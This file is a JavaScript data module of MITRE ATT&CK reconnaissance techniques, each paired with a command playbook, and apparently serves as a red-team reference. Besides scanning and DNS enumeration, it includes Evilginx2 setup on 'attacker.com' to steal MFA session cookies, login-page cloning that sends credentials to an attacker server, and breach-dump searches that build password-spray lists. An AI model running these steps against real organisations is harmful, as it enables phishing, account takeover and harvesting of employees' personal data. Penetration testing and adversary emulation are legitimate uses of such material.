export const RECONNAISSANCE = {
  id: "reconnaissance",
  name: "Reconnaissance",
  tacticId: "TA0043",
  subtitle: "Active Scanning • Vulnerability Scanning • Wordlist Scanning • OSINT • Identity Gathering • Employee Name Harvest • Email Harvesting • Credential Breach Search • Network Mapping • DNS Enumeration • Business Relationship Mapping • Phishing for Info • Open Source Research • Dark Web",
  color: "#22d3ee",
  techniques: [
    {
      name: "Active Scanning",
      id: "T1595",
      summary: "nmap • masscan • nikto • nuclei",
      description: "Actively probe target infrastructure using port scanners, vulnerability scanners, and banner grabbing tools",
      tags: ["nmap", "masscan", "nikto", "nuclei", "T1595"],
      steps: [
        "Phase 1 — Define scope and prepare tooling:\n# Confirm all in-scope IP ranges and domains before scanning\n# Create output directory for organized results\n$ mkdir -p recon/{nmap,masscan,nuclei,nikto}\n# Check that scanner IPs are authorized to avoid IDS/IPS bans during engagement",
        "Phase 2 — Fast async port sweep with masscan (large ranges):\n$ masscan -p1-65535 192.168.1.0/24 --rate=10000 -oJ recon/masscan/masscan.json\n# --rate=10000: 10k packets/sec — adjust down to 1000 on fragile networks\n# Use for /16 or /8 ranges where nmap would take hours\n$ cat recon/masscan/masscan.json | python3 -c \"import json,sys; [print(h['ip']) for h in json.load(sys.stdin)]\" | sort -u > live_hosts.txt",
        "Phase 3 — Detailed nmap on discovered live hosts:\n$ nmap -sS -sV -O -p- --open -T4 -iL live_hosts.txt -oA recon/nmap/full_scan\n# -sS: TCP SYN scan (stealth, requires root)\n# -sV: service/version detection — identifies Apache 2.4.49, OpenSSH 7.6 etc.\n# -O: OS fingerprinting — distinguish Windows/Linux for exploit targeting\n# --open: only show open ports to reduce output noise\n# Combine masscan speed (discovery) with nmap precision (identification)",
        "Phase 4 — Web & vulnerability scanning on discovered web services:\n$ cat recon/nmap/full_scan.gnmap | grep '80/open\\|443/open\\|8080/open\\|8443/open' | awk '{print $2}' > web_hosts.txt\n$ nikto -h https://target.com -Tuning 123bde -o recon/nikto/target.txt\n# Tuning 123bde: interesting files, misconfig, injection, SQL, XSS\n$ nuclei -l web_hosts.txt -t cves/ -t exposures/ -t misconfiguration/ -severity critical,high -o recon/nuclei/results.txt\n# nuclei templates updated daily — always run: nuclei -update-templates first",
        "Phase 5 — Manual banner grabbing on non-standard services:\n$ nc -nv 192.168.1.1 22        # SSH banner: reveals version\n$ nc -nv 192.168.1.1 25        # SMTP banner: reveals MTA + version\n$ curl -ik https://target.com -o /dev/null -D -  # HTTP headers: Server, X-Powered-By\n# Headers often reveal: IIS 10.0, Apache/2.4.49, PHP/7.4 — all searchable in CVE databases",
        "Phase 6 — Prioritize attack surface:\n# High value: exposed admin panels (/admin, /manager), VPN endpoints (Fortinet, Pulse, Citrix)\n# High value: databases (3306/MySQL, 1433/MSSQL, 5432/Postgres) exposed to internet\n# High value: RDP (3389), WinRM (5985/5986), unpatched web servers\n# Cross-reference discovered services with: searchsploit, nvd.nist.gov, exploit-db.com"
      ]
    },
    {
      name: "Gather Victim Host Information",
      id: "T1592",
      summary: "Shodan • Censys • FOFA • banner grabbing",
      description: "Gather hardware, OS, software versions, and configuration from passive sources without touching the target",
      tags: ["Shodan", "Censys", "FOFA", "T1592"],
      steps: [
        "Query Shodan for target org exposed assets:\n$ shodan search 'org:\"Target Corp\" port:443' --fields ip_str,port,org,hostnames\n$ shodan host 192.168.1.1\n# Requires Shodan API key",
        "Censys for certificates and hosts:\n$ censys search 'autonomous_system.name: Target' --index-type HOSTS --pages 5",
        "FOFA query (Chinese Shodan alternative):\n# app=\"Apache\" && org=\"target.com\"\n# Useful for finding assets missed by Shodan",
        "Banner grab and HTTP header analysis:\n$ curl -ik https://target.com | grep -Ei '(server|x-powered-by|x-aspnet|x-generator)'\n# Reveals server software and versions",
        "Cross-reference version info with CVE databases:\n$ searchsploit apache 2.4.49\n# Find known public exploits for identified versions"
      ]
    },
    {
      name: "Gather Victim Identity Information",
      id: "T1589",
      summary: "theHarvester • LinkedIn • HaveIBeenPwned • Hunter.io",
      description: "Collect email addresses, usernames, and employee data for phishing or credential attacks",
      tags: ["theHarvester", "LinkedIn", "Hunter.io", "T1589"],
      steps: [
        "Step 1 — Multi-source email harvesting:\n$ theHarvester -d target.com -b google,bing,linkedin,shodan,virustotal,yahoo,dnsdumpster -l 500 -f output\n# -b all: scrape every supported source simultaneously\n# Yields: email addresses, employee names, associated hostnames\n# Cross-reference results between sources to confirm validity",
        "Step 2 — Identify email format with Hunter.io:\n$ curl 'https://api.hunter.io/v2/domain-search?domain=target.com&api_key=KEY&limit=100'\n# Returns: dominant pattern (first.last@, flast@, firstl@) + all discovered addresses\n# Critical: knowing the pattern lets you generate a full employee email list from LinkedIn names\n# Free tier: 25 searches/month; paid API: 500+ results",
        "Step 3 — LinkedIn-to-username generation:\n$ python3 linkedin2username.py -c 'Target Corp' -u attacker@email.com -p password -d 3\n# Scrapes all employees from LinkedIn company page\n# -d 3: explore 3 levels of employee connections\n# Output: first.last, flast, firstl, f.last — test which matches found email format\n$ python3 namemash.py employees.txt > all_username_variants.txt\n# namemash.py generates all common variations from full name list",
        "Step 4 — Check breach databases for pre-compromised credentials:\n# dehashed.com API: query by @target.com domain\n$ curl -H 'Authorization: Basic BASE64_CREDS' 'https://api.dehashed.com/search?query=email:@target.com&size=1000'\n# IntelX.io: dark web + breach dataset search\n# Filter results: look for passwords alongside emails — skip empty-password entries\n# Pre-compromised accounts = immediate valid access without spray",
        "Step 5 — Generate targeted wordlists for spraying:\n$ cat employees.txt | awk '{print tolower($1\".\"$2)}' > usernames.txt\n# Apply discovered email format (step 2) to full employee list (step 3)\n# Validate discovered usernames before spraying:\n$ kerbrute userenum --dc DC_IP -d target.com usernames.txt\n# kerbrute confirms valid AD accounts without logging failed auth events\n# Only spray confirmed-valid usernames to minimize lockout risk"
      ]
    },
    {
      name: "Gather Victim Network Information",
      id: "T1590",
      summary: "WHOIS • ASN lookup • BGP • DNS zone transfer",
      description: "Map target network infrastructure including IP ranges, ASNs, and DNS records",
      tags: ["WHOIS", "ASN", "BGP", "DNS", "T1590"],
      steps: [
        "WHOIS and ASN lookup:\n$ whois target.com\n$ whois -h whois.radb.net -- '-i origin AS12345'\n# Find all IP blocks registered to the org",
        "BGP prefix enumeration:\n$ curl -s 'https://stat.ripe.net/data/announced-prefixes/data.json?resource=AS12345' | jq '.data.prefixes[].prefix'\n# Returns all IP ranges announced by the ASN",
        "DNS zone transfer attempt:\n$ dig axfr @ns1.target.com target.com\n# Usually fails on modern DNS but worth trying\n$ fierce --domain target.com\n# Comprehensive DNS recon tool",
        "Subdomain enumeration:\n$ subfinder -d target.com -all -o subdomains.txt\n$ amass enum -passive -d target.com -o amass.txt\n$ dnsx -l subdomains.txt -a -resp -o resolved.txt",
        "Reverse DNS on discovered ranges:\n$ nmap -sL 192.168.1.0/24 | grep 'Nmap scan report'\n# Maps IP to hostname without sending packets"
      ]
    },
    {
      name: "Gather Victim Org Information",
      id: "T1591",
      summary: "LinkedIn • job postings • annual reports • Google dorking",
      description: "Gather organizational structure, business relationships, and operational details for targeted attacks",
      tags: ["OSINT", "LinkedIn", "job postings", "T1591"],
      steps: [
        "LinkedIn company and employee enumeration:\n# Map org chart: C-suite, IT staff, security team, contractors\n# Identify decision makers and potential phishing targets",
        "Job posting technology analysis:\n# Google: site:linkedin.com/jobs 'Target Corp'\n# Also check: indeed.com, glassdoor.com, greenhouse.io\n# Job postings requiring 'CrowdStrike', 'Palo Alto', 'Cisco' reveal security stack",
        "Google dorking for internal documents:\n$ site:target.com filetype:pdf OR filetype:xlsx\n$ site:target.com inurl:internal OR inurl:confidential\n$ \"target corp\" filetype:pptx\n# Reveals org charts, project docs",
        "SEC EDGAR for company structure:\n# https://efts.sec.gov/LATEST/search-index?q=\"target+corp\"\n# 10-K/10-Q filings reveal subsidiaries, acquisitions, data centers",
        "Compile attack surface map: key targets, org structure, tech stack, entry points"
      ]
    },
    {
      name: "Phishing for Information",
      id: "T1598",
      summary: "Credential harvesting • Evilginx2 • GoPhish • pretexting",
      description: "Send phishing messages to elicit credentials, MFA codes, or sensitive internal information",
      tags: ["GoPhish", "Evilginx2", "credential harvest", "T1598"],
      steps: [
        "Set up phishing infrastructure:\n$ gophish\n# Access dashboard at https://127.0.0.1:3333\n# Configure SMTP relay, landing pages, email templates\n# For Microsoft Teams phishing:\n$ python3 teamphisher.py -u user@domain.com -p password -t victim@target.com -m lure.txt\n# Sends Teams message with phishing link to external users",
        "AiTM proxy for MFA bypass with Evilginx2:\n$ evilginx2 -developer\n> : config domain attacker.com\n> : config ip 1.2.3.4\n> : phishlets hostname microsoft attacker.com\n> : lures create microsoft\n# Captures session cookies even with MFA",
        "Clone legitimate login page:\n$ wget -r -l1 -k -p https://login.target.com -P ./clone\n# Modify form action to send creds to attacker server",
        "Craft pretexts for spearphishing:\n# IT password reset, benefits enrollment, HR policy update\n# Use employee names and org context from recon",
        "Monitor captured sessions:\n$ tail -f /root/.evilginx/log.json | jq '.'\n# Look for session tokens and cookies to hijack"
      ]
    },
    {
      name: "Search Open Technical Databases",
      id: "T1596",
      summary: "CT logs • VirusTotal • WHOIS history • Shodan",
      description: "Search freely available technical databases for target infrastructure, certificates, and passive DNS",
      tags: ["CT logs", "VirusTotal", "crt.sh", "T1596"],
      steps: [
        "Certificate Transparency log search:\n$ curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value' | sort -u | tee ct_subdomains.txt\n# Reveals all SSL certs ever issued for the domain",
        "VirusTotal for passive DNS and related infrastructure:\n$ curl -s 'https://www.virustotal.com/vtapi/v2/domain/report?apikey=KEY&domain=target.com' | jq '.subdomains'",
        "Shodan internet-wide scan data:\n$ shodan search 'ssl.cert.subject.CN:*.target.com' --fields ip_str,port,org\n$ shodan search 'http.html:\"target.com\" country:US'",
        "DNSDumpster for full DNS picture:\n# https://dnsdumpster.com - no API needed\n# Visualizes MX, A, CNAME, NS records and network topology",
        "Compile all passive data before active scanning to avoid detection:\n# Passive recon leaves no traces on target systems\n# Validate IPs before touching them"
      ]
    },
    {
      name: "Search Open Websites / Domains",
      id: "T1593",
      summary: "Google dorking • Wayback Machine • GitHub • Pastebin",
      description: "Search public websites and code repositories for sensitive files, credentials, and internal data",
      tags: ["Google dorking", "GitHub", "Wayback Machine", "T1593"],
      steps: [
        "Google dorking for exposed credentials and files:\n$ site:target.com filetype:env OR filetype:conf OR filetype:bak\n$ site:target.com intext:\"api_key\" OR intext:\"password\" OR intext:\"secret\"\n$ site:target.com ext:sql OR ext:log",
        "GitHub secret scanning:\n$ trufflehog github --org=target-org --only-verified\n$ gh search code 'target.com password' --limit 100\n# Search for: api_key, secret, token, bearer, password",
        "Wayback Machine for removed sensitive content:\n$ waybackurls target.com | grep -E '\\.(php|env|git|bak|sql|log)'\n$ gau target.com | grep -E '(admin|backup|config|secret|key)'\n# Old endpoints that were removed but still accessible",
        "Pastebin and code dump search:\n$ grep 'target.com' <(curl -s 'https://psbdmp.ws/api/search/target.com' | jq -r '.data[].id' | xargs -I{} echo 'https://pastebin.com/{}')\n# Also check: hastebin, rentry.co, GitHub Gists",
        "Parse and prioritize: credentials > internal URLs > tech stack > email addresses"
      ]
    },
    {
      name: "Search Victim-Owned Websites",
      id: "T1594",
      summary: "Web crawling • directory fuzzing • JS analysis • robots.txt",
      description: "Enumerate target web properties for hidden content, endpoints, and vulnerabilities",
      tags: ["feroxbuster", "gospider", "linkfinder", "T1594"],
      steps: [
        "Web crawling for all URLs:\n$ gospider -s https://target.com -o out -t 50 -d 3 --blacklist '.png,.jpg,.gif,.css'\n$ hakrawler -url https://target.com -depth 3 -plain | sort -u",
        "Directory and file brute-force:\n$ feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,asp,aspx,bak,zip,sql -t 100\n$ gobuster dir -u https://target.com -w wordlist.txt -t 50 -o gobuster.txt",
        "JavaScript endpoint extraction:\n$ cat js_urls.txt | xargs -I % sh -c 'linkfinder -i % -o cli'\n$ subjs -i https://target.com | xargs linkfinder -i {} -o cli\n# Reveals hidden API endpoints, tokens in JS",
        "Check standard paths:\n$ curl https://target.com/robots.txt\n$ curl https://target.com/.well-known/security.txt\n$ curl https://target.com/sitemap.xml\n$ curl https://target.com/crossdomain.xml",
        "Fingerprint web technology stack:\n$ whatweb https://target.com -v\n$ wappalyzer https://target.com\n# Identifies CMS, frameworks, CDN, analytics"
      ]
    },
    {
      name: "Active Scanning - Wordlist Scanning",
      id: "T1595.003",
      summary: "ffuf • gobuster • wfuzz • directory fuzzing • parameter brute",
      description: "Scan targets using wordlists to discover hidden paths, directories, and parameters",
      tags: ["ffuf", "gobuster", "wfuzz", "T1595"],
      steps: [
        "Directory and file discovery:\n$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u https://target.com/FUZZ -mc 200,301,302,403 -t 100\n$ gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50\n# Discover hidden directories and files",
        "Subdomain fuzzing:\n$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u https://FUZZ.target.com -H 'Host: FUZZ.target.com' -mc 200,301\n$ gobuster vhost -u https://target.com -w subdomains.txt\n# Virtual host and subdomain discovery",
        "Parameter discovery:\n$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://target.com/page?FUZZ=test' -mc 200\n$ arjun -u https://target.com/api/endpoint -m GET\n# Find hidden GET/POST parameters",
        "API endpoint fuzzing:\n$ ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u https://target.com/api/FUZZ -mc all -fc 404\n$ swagger-cli bundle api.yaml | python3 -c 'import sys,json; [print(k) for k in json.load(sys.stdin)[\"paths\"]]'\n# Enumerate API endpoints",
        "Content discovery with specific extensions:\n$ ffuf -w wordlist.txt -u https://target.com/FUZZ -e .php,.asp,.aspx,.bak,.old,.zip,.tar.gz -mc 200\n# Detect backup and source files"
      ]
    },
    {
      name: "Gather Victim Identity Info - Email Addresses",
      id: "T1589.002",
      summary: "Email harvesting • Hunter.io • theHarvester • breach data",
      description: "Collect email addresses of target employees for phishing and credential attacks",
      tags: ["email harvesting", "Hunter.io", "theHarvester", "T1589"],
      steps: [
        "theHarvester multi-source email collection:\n$ theHarvester -d target.com -b google,bing,linkedin,shodan,virustotal,yahoo -l 500 -f output\n# Sources: Google, Bing, LinkedIn, Shodan, VirusTotal",
        "Hunter.io API enumeration:\n$ curl 'https://api.hunter.io/v2/domain-search?domain=target.com&api_key=KEY&limit=100'\n# Returns email format (e.g., first.last@target.com) and discovered emails",
        "Email pattern generation:\n$ python3 -c \"\nimport itertools\nnames = [('John','Smith'),('Jane','Doe')]\nfor f,l in names:\n    print(f'{f.lower()}.{l.lower()}@target.com')\n    print(f'{f[0].lower()}{l.lower()}@target.com')\n    print(f'{f.lower()}{l[0].lower()}@target.com')\n\"",
        "LinkedIn email extraction with linkedin2username:\n$ python3 linkedin2username.py -c 'Target Corp' -u attacker@email.com -n 2\n# Generate usernames from LinkedIn employee names",
        "Validate discovered emails:\n$ python3 -c \"import smtplib; s=smtplib.SMTP('mail.target.com'); s.ehlo(); s.mail('test@test.com'); r=s.rcpt('target@target.com'); print(r)\"\n# SMTP VRFY/RCPT TO probe, catch-all detection, MX record validation"
      ]
    },
    {
      name: "Gather Victim Network Info - DNS",
      id: "T1590.002",
      summary: "DNS enumeration • zone transfer • subfinder • amass • dnsx",
      description: "Enumerate DNS records to map target network infrastructure",
      tags: ["DNS enum", "subfinder", "amass", "dnsx", "T1590"],
      steps: [
        "Passive subdomain enumeration:\n$ subfinder -d target.com -all -silent -o subs.txt\n$ amass enum -passive -d target.com -o amass_passive.txt\n$ curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value' | sort -u",
        "Active DNS brute-forcing:\n$ dnsx -l wordlist.txt -d target.com -a -resp -o resolved.txt\n$ gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt\n$ massdns -r resolvers.txt -t A -o S -w massdns.txt subs.txt",
        "DNS record enumeration:\n$ dig target.com ANY\n$ dig target.com MX\n$ dig target.com NS\n$ dig target.com TXT  # SPF, DMARC, DKIM records\n$ dig -t AXFR target.com @ns1.target.com  # Zone transfer attempt",
        "Reverse DNS and PTR records:\n$ nmap -sL 192.168.1.0/24 --dns-servers 8.8.8.8 | grep 'Nmap scan'\n$ for ip in $(seq 1 254); do host 192.168.1.$ip 2>/dev/null | grep 'domain name'; done\n# Map IPs to hostnames",
        "DNS history and passive DNS:\n$ curl 'https://api.securitytrails.com/v1/history/target.com/dns/a' -H 'APIKEY: KEY'\n# Historical DNS records reveal old infrastructure"
      ]
    },
    {
      name: "Gather Victim Identity Info - Credentials",
      id: "T1589.001",
      summary: "Breach databases • credential dumps • combolists • dark web credentials",
      description: "Search leaked credential databases and breach dumps for target organization credentials",
      tags: ["breach data", "combolists", "dehashed", "T1589"],
      steps: [
        "Search dehashed.com for target domain:\n$ curl -H 'Authorization: Basic BASE64_CREDS' 'https://api.dehashed.com/search?query=@target.com&size=10000'\n# Returns email:password pairs from known breaches\n# Filter by domain to find employee credentials",
        "IntelligenceX search:\n$ ix search '@target.com' --datefrom 2020-01-01\n# IntelX indexes dark web, breaches, pastes\n# API: intelx.io",
        "Process breach compilation datasets:\n$ grep -ri '@target.com' /data/breach_compilations/ | cut -d: -f1-3\n# Large breach files: Collection #1-5, COMB, RockYou2021\n# Extract credentials matching target domain",
        "Validate discovered credentials:\n$ python3 o365spray.py --validate --domain target.com --output valid_users.txt\n# o365spray: https://github.com/0xZDH/o365spray — validate email existence\n$ kerbrute userenum --dc DC_IP -d target.com valid_users.txt\n# Test against O365, VPN portals, webmail with known-valid accounts\n# One valid cred can provide initial access",
        "Build spray list from breached passwords:\n$ sort breach_passwords.txt | uniq -c | sort -rn | head 100 | awk '{print $2}' > top100.txt\n# Frequency analysis: most reused passwords from breaches\n# Combine with seasonal patterns: Summer2024!, Company@2024"
      ]
    },
    {
      name: "Gather Victim Org Info - Business Relationships",
      id: "T1591.002",
      summary: "Vendor enumeration • partner discovery • supply chain mapping • trusted third parties",
      description: "Identify business relationships, vendors, and partners for supply chain and trusted relationship attacks",
      tags: ["vendor enum", "supply chain", "business relationships", "T1591"],
      steps: [
        "SEC filing analysis for vendor relationships:\n# 10-K/10-Q: 'Key customers', 'vendors', 'service providers'\n# 8-K: discloses major contracts and partnerships\n$ curl 'https://efts.sec.gov/LATEST/search-index?q=\"target+corp\"+\"service+provider\"&dateRange=custom&startdt=2023-01-01'",
        "Certificate/DNS pivoting to find related infrastructure:\n$ shodan search 'ssl.cert.subject.O:\"Target Corp\"' --fields ip_str,domains\n# Find all certs with target org name in subject\n# Reveals cloud infra, partners, subsidiaries",
        "Job postings for technology partnerships:\n# 'We are seeking experience with...' reveals tech stack\n# Partner logos on website reveal key vendors\n# Press releases: 'Target Corp selects [Vendor] for...'",
        "GitHub/LinkedIn discovery of vendor relationships:\n# Search GitHub: 'target-corp' in org file, partner integrations\n# LinkedIn: filter employees who listed 'target.com' as past employer at vendors",
        "Identify MSPs and IT service providers:\n$ shodan search 'org:\"Target Corp\" port:3389'\n# RDP may be from MSP managing their systems\n# SNMP community strings may reveal IT vendor names\n# MSP email formats often visible in job postings"
      ]
    },
    {
      name: "Gather Victim Identity Info - Employee Names",
      id: "T1589.003",
      summary: "LinkedIn OSINT • org chart harvesting • name2email • employee enumeration",
      description: "Harvest employee full names to generate username lists and build targeting packages",
      tags: ["employee names", "LinkedIn", "org chart", "T1589"],
      steps: [
        "LinkedIn employee name harvesting:\n$ python3 linkedin2username.py -c 'Target Corp' -u attacker@email.com -p password -d 3\n# Harvests all employee names from LinkedIn company page\n# -d 3: dig 3 levels deep, includes connected profiles\n# Output: firstname.lastname list → username generation",
        "Build targeted username lists:\n$ cat names.txt | python3 namemash.py > usernames.txt\n# namemash.py: generates all common variations from full names:\n# john.smith, jsmith, johnsmith, johns, smith.john, etc.\n# Test which pattern is used: kerbrute userenum -d domain.com usernames.txt --dc DC_IP",
        "Cross-reference with breach data:\n$ grep -f names.txt breached_emails.txt | cut -d: -f1,2\n# Match names with breach database entries\n# Known email format + breached passwords = credential spray list",
        "OSINT framework employee mapping:\n# Maltego: entity graph of company employees\n# SpiderFoot: automated OSINT with employee module\n$ spiderfoot -s target.com -m sfp_linkedin\n# Cross-correlate: LinkedIn → email → breach → credentials",
        "Job posting and conference speaker analysis:\n# Speaker bios at industry conferences reveal employees\n# Published papers, blog posts, GitHub commits reveal names\n$ python3 crosslinked.py -f '{first}.{last}@target.com' 'Target Corp'\n# CrossLinked: LinkedIn scraper that generates email combos from names"
      ]
    },
    {
      name: "Active Scanning - Vulnerability Scanning",
      id: "T1595.002",
      summary: "Nuclei • Nessus • OpenVAS • CVE scanning • external vulnerability scan",
      description: "Actively scan target infrastructure for known vulnerabilities before exploitation",
      tags: ["nuclei", "Nessus", "OpenVAS", "CVE scanning", "T1595"],
      steps: [
        "Nuclei comprehensive vulnerability scan:\n$ nuclei -l live_targets.txt -t cves/ -t exposures/ -t misconfiguration/ -t technologies/ -severity critical,high,medium -o nuclei_results.txt -rate-limit 100\n# -l: target list; -t: template directories\n# Covers: CVEs, exposed panels, misconfigurations, tech detection",
        "Fast external CVE scan:\n$ nuclei -l targets.txt -t cves/2021/ -t cves/2022/ -t cves/2023/ -t cves/2024/ -tags rce,lfi,sqli -o critical_cves.txt\n# Focus on high-impact vulnerability classes\n# Sort by severity: RCE > SQLi > LFI > SSRF",
        "Nessus / OpenVAS external scan:\n# Nessus: nessuscli scan --hosts 'target.com' --policy 'External Network Scan'\n# OpenVAS: gvm-cli socket --xml '<get_scanners/>'\n# Schedule scan against external IPs\n# Export results: XML/CSV for analysis",
        "Custom CVE scanner for specific vulnerability:\n$ nuclei -l targets.txt -id CVE-2023-44487 -o cve_check.txt\n# Use nuclei template for specific CVE across all targets\n# Or write custom Python checker targeting the specific vulnerability",
        "Web technology fingerprint and CVE match:\n$ whatweb -i live_targets.txt -a 3 --log-json /tmp/whatweb.json\n$ cat /tmp/whatweb.json | jq -r '.[] | .target + \" \" + (.plugins | to_entries[] | .key + \":\" + (.value.version // [\"?\"])[0])' 2>/dev/null\n# Extract versions, cross-reference with: searchsploit, cvedetails.com, nvd.nist.gov\n# Prioritize exploitable unpatched services"
      ]
    },
    {
      name: "Search Closed Sources",
      id: "T1597",
      summary: "Dark web • threat intel platforms • breach data • IAB",
      description: "Search dark web markets, threat intelligence feeds, and criminal forums for target-specific data",
      tags: ["dark web", "threat intel", "breach data", "T1597"],
      steps: [
        "Commercial threat intelligence platforms:\n# Recorded Future, Intel 471, Flashpoint, ZeroFox\n# Search for target org mentions, leaked credentials, access for sale",
        "Breach compilation search:\n$ curl -H 'Authorization: Basic BASE64' 'https://dehashed.com/search?query=@target.com&size=10000'\n# IntelX.io, LeakBase, breach databases",
        "Dark web market and forum monitoring:\n# Use Tor Browser, search .onion sites for target org\n# Initial Access Brokers (IABs) sell VPN/RDP access\n# Check Ransomware leak sites for prior breaches",
        "Underground forum search for target credentials:\n# Common forums: XSS.is, Exploit.in, RaidForums mirrors\n# Look for VPN credentials, cookie dumps, session tokens",
        "Pivot from discovered info to additional targets:\n# Leaked creds → password spray → initial access\n# Stolen session cookies → direct account access"
      ]
    },
  ]
};